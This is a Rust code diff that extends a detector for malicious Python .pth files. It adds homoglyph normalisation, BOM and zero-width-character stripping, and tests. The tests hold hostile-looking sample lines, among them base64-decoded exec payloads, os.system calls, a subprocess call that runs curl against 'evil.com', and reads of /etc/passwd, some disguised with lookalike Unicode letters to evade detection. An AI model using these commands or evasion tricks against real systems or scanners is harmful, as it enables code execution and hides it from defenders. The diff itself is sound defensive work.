@@ -141,6 +141,10 @@ const HOMOGLYPH_MAP: &[(char, char)] = &[
     ('\u{FF45}', 'e'), // Fullwidth Latin small e ｅ → Latin e
     ('\u{FF58}', 'x'), // Fullwidth Latin small x ｘ → Latin x
     ('\u{FF43}', 'c'), // Fullwidth Latin small c ｃ → Latin c
+    ('\u{0455}', 's'), // Cyrillic dze ѕ → Latin s
+    ('\u{0442}', 't'), // Cyrillic te т → Latin t
+    ('\u{03C5}', 'u'), // Greek upsilon υ → Latin u
+    ('\u{04CF}', 'l'), // Cyrillic palochka ӏ → Latin l
 ];
 
 /// Check whether `line` contains any critical keyword spelled with
@@ -285,10 +289,22 @@ pub fn analyse_pth_line(line: &str) -> PthVerdict {
 /// The file verdict is the maximum severity of any individual line.
 /// Continuation lines (backslash followed by newline) are joined before
 /// analysis so that keywords split across lines are still detected.
+///
+/// A leading UTF-8 BOM (`\u{FEFF}`) is stripped before processing.
+/// Zero-width characters (U+200B, U+200C, U+200D, U+FEFF mid-string)
+/// are also removed to prevent evasion.
 #[must_use]
 pub fn analyse_pth_file(content: &str) -> FileAnalysis {
     let mut critical_lines = Vec::new();
     let mut warning_lines = Vec::new();
+
+    // Strip leading UTF-8 BOM if present
+    let content = content.strip_prefix('\u{FEFF}').unwrap_or(content);
+
+    // Strip zero-width characters that could be used for evasion:
+    // U+200B zero-width space, U+200C zero-width non-joiner,
+    // U+200D zero-width joiner, U+FEFF zero-width no-break space (BOM when mid-string)
+    let content = content.replace(['\u{200B}', '\u{200C}', '\u{200D}', '\u{FEFF}'], "");
 
     // Join Python continuation lines: a backslash immediately before a
     // newline means the logical line continues on the next physical line.
@@ -866,6 +882,83 @@ mod tests {
     fn homoglyph_codecs_fullwidth_c() {
         // U+FF43 (fullwidth Latin small c) instead of Latin c in "codecs."
         let result = analyse_pth_line("\u{FF43}odecs.open('/etc/passwd')");
+        assert_eq!(result.level(), ThreatLevel::Critical);
+    }
+
+    // ============================================================
+    // UTF-8 BOM stripping
+    // ============================================================
+
+    #[test]
+    fn utf8_bom_stripped_from_file_content() {
+        let content = "\u{FEFF}import base64;exec(base64.b64decode('payload'))";
+        let result = analyse_pth_file(content);
+        assert_eq!(
+            result.verdict,
+            FileVerdict::Critical,
+            "UTF-8 BOM must be stripped so the line is still detected"
+        );
+    }
+
+    #[test]
+    fn utf8_bom_stripped_benign_content_stays_benign() {
+        let content = "\u{FEFF}/usr/lib/python3.12/dist-packages/pkg\n";
+        let result = analyse_pth_file(content);
+        assert_eq!(result.verdict, FileVerdict::Safe);
+    }
+
+    // ============================================================
+    // Zero-width character stripping
+    // ============================================================
+
+    #[test]
+    fn zero_width_space_stripped_critical_detected() {
+        let content = "\u{200B}import os; os.system('evil')";
+        let result = analyse_pth_file(content);
+        assert_eq!(
+            result.verdict,
+            FileVerdict::Critical,
+            "zero-width space must be stripped so os.system( is detected"
+        );
+    }
+
+    #[test]
+    fn zero_width_non_joiner_stripped() {
+        let content = "ex\u{200C}ec(payload)";
+        let result = analyse_pth_file(content);
+        assert_eq!(result.verdict, FileVerdict::Critical);
+    }
+
+    #[test]
+    fn zero_width_joiner_stripped() {
+        let content = "ev\u{200D}al(payload)";
+        let result = analyse_pth_file(content);
+        assert_eq!(result.verdict, FileVerdict::Critical);
+    }
+
+    // ============================================================
+    // Expanded homoglyph map
+    // ============================================================
+
+    #[test]
+    fn homoglyph_cyrillic_dze_subprocess() {
+        let result = analyse_pth_line("\u{0455}ubprocess.Popen(['curl','evil.com'])");
+        assert_eq!(
+            result.level(),
+            ThreatLevel::Critical,
+            "Cyrillic dze in subprocess should be normalised and detected"
+        );
+    }
+
+    #[test]
+    fn homoglyph_cyrillic_te() {
+        let result = analyse_pth_line("c\u{0442}ypes.CDLL('libc.so.6').system(b'id')");
+        assert_eq!(result.level(), ThreatLevel::Critical);
+    }
+
+    #[test]
+    fn homoglyph_greek_upsilon() {
+        let result = analyse_pth_line("s\u{03C5}bprocess.Popen(['curl','evil.com'])");
         assert_eq!(result.level(), ThreatLevel::Critical);
     }
 }
